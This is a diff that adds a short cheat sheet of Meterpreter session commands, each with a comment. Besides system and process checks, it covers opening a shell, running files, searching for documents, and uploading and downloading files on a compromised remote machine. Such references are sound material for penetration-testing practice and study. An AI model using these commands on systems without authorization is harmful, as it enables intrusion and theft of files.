@@ -1,0 +1,35 @@
+# Check user ID
+getuid
+
+# Get System Information
+sysinfo
+
+# Execute a file
+execute -f /path/to/file
+
+# Drop into a local shell
+shell               ;; press ctrl+x to go back to meterpreter
+
+# Put session in background
+background          ;; or bg
+
+# Display Network Configuration
+ipconfig
+
+# Show processes
+ps
+
+# Search for all DOC files
+search -f *.doc
+
+# Search for files starting with "sea" and extension .bat in the xamp directory
+search -f sea*.bat c:\\xamp\\
+
+# Upload a file on the remote machine
+upload /path/to/local/file /tmp/destinationfile
+
+# Download a file from the remote machine
+download /path/to/remote/file /tmp/localdestinationfile
+
+# Edit a file
+edit /path/to/file.txt
